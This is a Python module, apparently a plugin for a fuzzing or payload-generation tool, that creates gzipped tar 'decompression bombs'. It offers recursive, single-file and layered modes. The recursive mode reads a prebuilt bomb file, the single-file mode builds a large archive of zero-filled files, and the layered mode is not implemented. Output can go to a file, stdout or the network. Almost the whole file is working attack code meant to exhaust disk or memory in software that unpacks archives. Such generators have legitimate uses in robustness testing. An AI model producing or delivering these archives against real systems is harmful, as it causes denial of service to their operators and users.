import os
import io
import tarfile
import logging
from options import Options


options = Options()
options.add_option('type', 'recursive', 'Type of bomb', ['single_file', 'layer', 'recursive'])
options.add_option('target_size', 100000,
                   'Desired size of decompressed file in bytes (not applicable to recursive bombs)')

DESCRIPTION = 'Produces a gzipped tar archive that expands into a very large file or set of files'


def run(generator, output):

    if output.OUTPUT_NAME not in ["file", "stdout", "network"]:
        raise ValueError("Unsupported output type for gz bomb.")

    if output.OUTPUT_NAME == "file" and output.options["format"] != "binary":
        raise ValueError("Only binary files are supported for output.")

    if options['type'] == 'recursive':
        with open(os.path.dirname(os.path.realpath(__file__)) + '/bombs-DONOTOPEN/tar_gz_recursive.tar.gz', 'rb') as f:
            contents = f.read()
        output.output([contents])

    elif options['type'] == 'single_file':
        tar_gz_contents = singlefilebomb(options['target_size'])
        output.output([tar_gz_contents])

    elif options['type'] == 'layer':
        logging.warning('Not yet implemented.')


def add_file_to_tar(tar, filename, size):
    with io.BytesIO() as memfile:
        memfile.write(b'0' * size)
        memfile.seek(0)
        tarinfo = tarfile.TarInfo(filename)
        tarinfo.size = size
        tar.addfile(tarinfo, memfile)


def singlefilebomb(target_size):
    with io.BytesIO() as memtarfile:
        with tarfile.open('singlefilebomb.tar', fileobj=memtarfile, mode='w|gz') as tar:
            for i in range(target_size // 1000):
                add_file_to_tar(tar, 'file_{}'.format(i), 1000)
            add_file_to_tar(tar, 'file_{}'.format(target_size // 1000), target_size % 1000)
        return memtarfile.getvalue()
